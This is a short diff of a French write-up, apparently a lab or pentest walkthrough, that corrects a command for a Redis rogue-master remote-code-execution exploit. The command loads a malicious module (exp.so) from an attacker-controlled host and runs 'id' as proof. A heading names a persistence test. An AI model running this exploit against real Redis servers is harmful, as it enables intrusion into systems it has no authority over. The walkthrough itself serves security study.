@@ -68,7 +68,7 @@ Nous lançons le script Python en définissant l'IP de la victime (-r) et notre 
 
 Test 1 : Obtention de l'identité (Preuve RCE)
 ```
-python3 redis-master.py -r <ip-attaquant> -p 6379 -L <ip-attaquant> -P 8888 -f RedisModulesSDK/exp.so -c "id"
+python3 redis-master.py -r <ip-victime> -p 6379 -L <ip-attaquant> -P 8888 -f RedisModulesSDK/exp.so -c "id"
 ```
 
 Test 2 : Création de fichier (Preuve de persistance)
